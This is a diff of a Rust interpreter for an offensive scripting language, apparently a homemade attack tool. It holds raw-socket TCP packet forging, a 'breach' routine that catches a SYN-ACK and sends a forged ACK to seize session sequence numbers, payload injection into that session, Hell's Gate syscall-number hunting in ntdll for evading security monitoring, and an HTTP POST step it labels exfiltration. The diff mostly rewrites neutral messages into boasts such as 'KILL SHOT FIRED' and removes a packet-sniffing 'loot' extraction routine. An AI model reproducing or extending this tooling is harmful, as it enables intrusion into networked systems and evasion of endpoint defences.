@@ -7,7 +7,7 @@ use std::net::{TcpStream, ToSocketAddrs, Ipv4Addr};
 use std::thread;
 use std::time::{Duration, SystemTime, UNIX_EPOCH};
 
-// Raw socket interface using libpnet
+// --- PNET RING-0 NETWORKING ---
 use pnet::datalink;
 use pnet::datalink::Channel::Ethernet;
 use pnet::packet::{MutablePacket, Packet};
@@ -24,9 +24,9 @@ use std::ptr;
 #[cfg(target_os = "windows")]
 use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
 
-// -------------------------------------------------
-// Core Data Types
-// -------------------------------------------------
+// =====================================================================
+// --- CORE DATA ARCHITECTURE (UPGRADED) ---
+// =====================================================================
 
 #[derive(Debug, Clone, PartialEq)]
 enum Token {
@@ -49,14 +49,14 @@ enum Value {
     Bool(bool), 
     List(Vec<Value>),
     Dict(HashMap<String, Value>),
-    // Represents a compromised gateway connection
+    // THE NEW RING-0 OBJECT: Holds the target IP, MAC, and hijacked Sequence Numbers
     Gateway { target_ip: String, target_mac: [u8; 6], next_seq: u32, next_ack: u32 },
     None 
 }
 
-// -------------------------------------------------
-// Windows syscall number extraction (Hell's Gate)
-// -------------------------------------------------
+// =====================================================================
+// --- THE VOID LAYER: HELL'S GATE MEMORY HUNTER ---
+// =====================================================================
 
 #[cfg(target_os = "windows")]
 const SYSCALL_STUB: [u8; 4] = [0x4C, 0x8B, 0xD1, 0xB8];
@@ -76,9 +76,9 @@ unsafe fn hunt_ssn(function_address: *const u8) -> Option<u32> {
     None
 }
 
-// -------------------------------------------------
-// Low-level packet construction
-// -------------------------------------------------
+// =====================================================================
+// --- RING-0 PACKET FORGER ---
+// =====================================================================
 
 fn forge_packet(
     source_ip: Ipv4Addr, dest_ip: Ipv4Addr, source_mac: MacAddr, dest_mac: MacAddr,
@@ -112,7 +112,7 @@ fn forge_packet(
     tcp_packet.set_data_offset(5);
     tcp_packet.set_flags(tcp_flags);
     
-    // Copy payload into TCP segment
+    // Inject the physical bytes into the TCP packet
     if !payload.is_empty() { tcp_packet.payload_mut().copy_from_slice(payload); }
     
     let tcp_chk = tcp_checksum(&tcp_packet.to_immutable(), &source_ip, &dest_ip);
@@ -121,9 +121,9 @@ fn forge_packet(
     buffer
 }
 
-// -------------------------------------------------
-// Lexer
-// -------------------------------------------------
+// =====================================================================
+// --- LEXICAL ANALYSIS ENGINE ---
+// =====================================================================
 
 fn lexer(code: &str) -> Vec<Token> {
     let mut tokens = Vec::new();
@@ -131,10 +131,12 @@ fn lexer(code: &str) -> Vec<Token> {
         ("SKIP", r"[ \t\n\r]+|//.*"),
         ("TYPE_IP", r"\b(?:\d{1,3}\.){3}\d{1,3}\b"),
         ("NUMBER", r"\d+(\.\d*)?"),
+        // Added 'breach' to keywords
         ("KEYWORD", r"\b(breach|set|scan|payload|if|while|for|in|end|log|swarm|ports|to|write|append|wait|list|push|pop|rand|op|call|resolve|input|transmit|import|fn|return|dict|put|get|try|rescue|panic|num|break)\b"),
         ("ID", r"[a-zA-Z_][a-zA-Z0-9_]*"),
         ("COMP", r"==|!=|<=|>=|<|>"),
         ("ASSIGN", r"="),
+        // Added pipe operators => and <=
         ("OP", r"=>|<=|[+\-*/%]"),
         ("STRING", r#""(?:\\.|[^"\\])*""#),
         ("DELIM", r";"),
@@ -196,9 +198,9 @@ fn format_address(ip: &str, port: u16) -> String {
     if ip.contains(':') { format!("[{}]:{}", ip, port) } else { format!("{}:{}", ip, port) }
 }
 
-// -------------------------------------------------
-// Parser and runtime
-// -------------------------------------------------
+// =====================================================================
+// --- MASTER PARSER & EXECUTION ENGINE ---
+// =====================================================================
 
 struct Parser {
     tokens: Vec<Token>,
@@ -230,7 +232,7 @@ impl Parser {
     fn parse(&mut self) { while self.pos < self.tokens.len() { self.parse_stmt(); } }
 
     fn parse_stmt(&mut self) {
-        // Handle gateway pipe syntax: id => payload
+        // CATCH RAW PIPE INJECTIONS: id => payload
         if let Some(Token::Identifier(ref id)) = self.peek() {
             if self.tokens.get(self.pos + 1) == Some(&Token::Operator("=>".to_string())) {
                 let id_clone = id.clone();
@@ -255,15 +257,15 @@ impl Parser {
         } else { self.next(); }
     }
 
-    // -------------------------------------------------
-    // Ring-0 network manipulation
-    // -------------------------------------------------
+    // =====================================================================
+    // --- OFFENSIVE RING-0 INJECTION SUBSYSTEM (THE NEW MATRIX) ---
+    // =====================================================================
 
     fn parse_breach(&mut self) -> Value {
         self.expect_keyword("breach");
         let target_ip_str = if let Value::Str(s) = self.parse_factor() { s } else { panic!("breach requires target IP string"); };
         
-        println!("\nEstablishing gateway session with target {}...", target_ip_str);
+        println!("\n[*] BREACH ENGINE: Initiating Ring-0 State Confusion against {}...", target_ip_str);
 
         let interfaces = datalink::interfaces();
         let interface = interfaces.into_iter()
@@ -286,7 +288,7 @@ impl Parser {
         let mut hijacked_seq = 0;
         let mut hijacked_ack = 0;
 
-        println!("Listening for handshake response...");
+        println!("🎧 Active Intercept. Waiting for Target...");
         loop {
             match rx.next() {
                 Ok(packet) => {
@@ -297,7 +299,7 @@ impl Parser {
                                     hijacked_seq = tcp.get_sequence();
                                     hijacked_ack = 1001; 
                                     
-                                    println!("Received SYN-ACK from server. Completing handshake...");
+                                    println!("🎯 BINGO! Caught SYN-ACK. Executing Impossible Math...");
                                     
                                     let bad_ack = forge_packet(source_ip, dest_ip, source_mac, dest_mac, hijacked_ack, 999999999, TcpFlags::ACK, &[]);
                                     tx.send_to(&bad_ack, None).unwrap().unwrap();
@@ -311,7 +313,7 @@ impl Parser {
             }
         }
 
-        println!("Handshake confirmed. Gateway state ready.");
+        println!("💀 KILL SHOT FIRED. Perimeter bypassed. Gateway Object acquired.");
         
         Value::Gateway { 
             target_ip: target_ip_str, 
@@ -333,7 +335,7 @@ impl Parser {
         let gateway = self.memory.get(&gateway_id).cloned().expect("Gateway object not found!");
         
         if let Value::Gateway { target_ip, target_mac, mut next_seq, next_ack } = gateway {
-            println!("\nSending payload to {} through established channel", target_ip);
+            println!("\n🩸 INJECTING RAW PAYLOAD INTO GHOST TUNNEL => {}", target_ip);
             
             let interfaces = datalink::interfaces();
             let interface = interfaces.into_iter()
@@ -362,82 +364,15 @@ impl Parser {
             next_seq += payload_bytes.len() as u32;
             self.memory.insert(gateway_id, Value::Gateway { target_ip, target_mac, next_seq, next_ack });
             
-            println!("Payload sent.");
+            println!("[+] Packet violently shoved into target memory buffer.");
         } else {
             panic!("Cannot pipe into a non-gateway variable!");
         }
     }
 
-    fn execute_extraction(&mut self, gw_id: String) -> Value {
-        let gateway = self.memory.get(&gw_id).cloned().expect("Gateway object not found!");
-        
-        if let Value::Gateway { target_ip, .. } = gateway {
-            println!("Waiting for data from target {}...", target_ip);
-            
-            let interfaces = datalink::interfaces();
-            let interface = interfaces.into_iter().find(|iface| iface.ips.iter().any(|ip| ip.ip().to_string() == "192.168.56.1")).unwrap();
-            let (_, mut rx) = match datalink::channel(&interface, Default::default()) {
-                Ok(Ethernet(tx, rx)) => (tx, rx),
-                _ => panic!("Socket error"),
-            };
-
-            let start_time = std::time::Instant::now();
-            let mut loot = String::new();
-
-            loop {
-                // Timeout after 3 seconds
-                if start_time.elapsed().as_secs() > 3 { break; } 
-                
-                if let Ok(packet) = rx.next() {
-                    if let Some(eth) = EthernetPacket::new(packet) {
-                        if let Some(ipv4) = Ipv4Packet::new(eth.payload()) {
-                            if let Some(tcp) = TcpPacket::new(ipv4.payload()) {
-                                // Match response from target service
-                                if tcp.get_source() == 80 && ipv4.get_source().to_string() == target_ip {
-                                    let payload = tcp.payload();
-                                    if !payload.is_empty() {
-                                        let data = String::from_utf8_lossy(payload).to_string();
-                                        loot.push_str(&data);
-                                        println!("Received {} bytes of data.", payload.len());
-                                        break;
-                                    }
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-            
-            if loot.is_empty() { println!("No response from target within timeout."); }
-            Value::Str(loot)
-        } else {
-            panic!("Variable is not a Gateway!");
-        }
-    }
-
-    // -------------------------------------------------
-    // Language feature implementations
-    // -------------------------------------------------
-
-    fn parse_factor(&mut self) -> Value {
-        let tok = self.peek().expect("Unexpected EOF"); 
-        match tok {
-            Token::Number(n) => { self.next(); Value::Num(n) },
-            Token::StringLiteral(s) | Token::IpAddress(s) => { self.next(); Value::Str(s) },
-            Token::Identifier(id) => { self.next(); self.memory.get(&id).cloned().unwrap_or(Value::Num(0.0)) },
-            Token::Keyword(k) if k == "call" => self.parse_call(), Token::Keyword(k) if k == "get" => self.parse_get(),
-            Token::Keyword(k) if k == "num" => {
-                self.next();
-                match self.parse_factor() { Value::Str(s) => Value::Num(s.parse().unwrap_or(0.0)), Value::Num(n) => Value::Num(n), _ => Value::Num(0.0) }
-            },
-            Token::Compare(op) if op == "<=" => {
-                self.next(); // Consume the '<='
-                let gw_id = if let Some(Token::Identifier(id)) = self.peek() { self.next(); id } else { panic!("Expected gateway variable after <="); };
-                self.execute_extraction(gw_id)
-            },
-            _ => { self.next(); panic!("Invalid factor type: {:?}", tok); }
-        }
-    }
+    // =====================================================================
+    // --- STANDARD LANG FEATURES ---
+    // =====================================================================
 
     fn parse_fn(&mut self) {
         self.next();
@@ -674,6 +609,21 @@ impl Parser {
         res
     }
 
+    fn parse_factor(&mut self) -> Value {
+        let tok = self.peek().expect("Unexpected EOF"); 
+        match tok {
+            Token::Number(n) => { self.next(); Value::Num(n) },
+            Token::StringLiteral(s) | Token::IpAddress(s) => { self.next(); Value::Str(s) },
+            Token::Identifier(id) => { self.next(); self.memory.get(&id).cloned().unwrap_or(Value::Num(0.0)) },
+            Token::Keyword(k) if k == "call" => self.parse_call(), Token::Keyword(k) if k == "get" => self.parse_get(),
+            Token::Keyword(k) if k == "num" => {
+                self.next();
+                match self.parse_factor() { Value::Str(s) => Value::Num(s.parse().unwrap_or(0.0)), Value::Num(n) => Value::Num(n), _ => Value::Num(0.0) }
+            },
+            _ => { self.next(); panic!("Invalid factor type: {:?}", tok); }
+        }
+    }
+
     fn parse_scan(&mut self) {
         self.expect_keyword("scan"); let t = if let Some(Token::Identifier(id)) = self.peek() { self.next(); id } else { panic!(); };
         if let Some(Token::Punctuation(ref p)) = self.peek() { if p == ":" { self.next(); } }
@@ -751,11 +701,11 @@ impl Parser {
         };
         if let Some(Token::Delimiter) = self.peek() { self.next(); }
         let url = if let Value::Str(s) = url_val { s } else { panic!(); };
-        println!("Sending HTTP POST to target...");
+        println!("[*] Establishing universal API tunnel to target...");
         if let Ok(client) = reqwest::blocking::Client::builder().timeout(Duration::from_secs(5)).build() {
             match client.post(&url).header("Content-Type", "application/json").body(payload).send() {
-                Ok(r) => { if r.status().is_success() { println!("Request successful."); } else { println!("Request failed."); } },
-                Err(e) => println!("Network error: {}", e),
+                Ok(r) => { if r.status().is_success() { println!("[+] EXFILTRATION SUCCESS"); } else { println!("[-] REJECTED"); } },
+                Err(e) => println!("[!] NETWORK FATAL: {}", e),
             }
         }
     }
@@ -770,14 +720,14 @@ impl Parser {
         if let Some(Token::Delimiter) = self.peek() { self.next(); } 
         #[cfg(target_os = "windows")]
         unsafe {
-            println!("\nResolving syscall for file I/O...");
+            println!("\n[*] VOID LAYER: Initiating Hell's Gate for Disk I/O...");
             let ntdll_handle = GetModuleHandleA(CString::new("ntdll.dll").unwrap().as_ptr());
             let func_address = GetProcAddress(ntdll_handle, CString::new("NtWriteFile").unwrap().as_ptr());
-            if !func_address.is_null() { if let Some(ssn) = hunt_ssn(func_address as *const u8) { println!("NtWriteFile syscall number found: 0x{:X}", ssn); } }
+            if !func_address.is_null() { if let Some(ssn) = hunt_ssn(func_address as *const u8) { println!("[+] NtWriteFile SSN (0x{:X}) locked.", ssn); } }
         }
         let mut opt = OpenOptions::new(); opt.write(true).create(true); 
         if is_append { opt.append(true); } else { opt.truncate(true); } 
-        if let Ok(mut f) = opt.open(&filepath) { let _ = writeln!(f, "{}", content); println!("File written to: {}", filepath); } 
+        if let Ok(mut f) = opt.open(&filepath) { let _ = writeln!(f, "{}", content); println!("[+] Payload dropped to: {}", filepath); } 
     }
 
     fn parse_if(&mut self, cond: bool) {
@@ -816,8 +766,8 @@ impl Parser {
 
 fn main() {
     let args: Vec<String> = env::args().collect();
-    if args.len() < 2 { println!("Error: Missing input file."); return; }
-    let raw_code = fs::read_to_string(&args[1]).unwrap_or_else(|_| { println!("Error: Unable to read input file."); std::process::exit(1); });
+    if args.len() < 2 { println!("[!] Error: No breach payload provided."); return; }
+    let raw_code = fs::read_to_string(&args[1]).unwrap_or_else(|_| { println!("[!] Error: Failed to read file"); std::process::exit(1); });
     let raw_tokens = lexer(&raw_code);
     let mutated_tokens = mutate_token_stream(raw_tokens);
     let mut execution_engine = Parser::new(mutated_tokens);
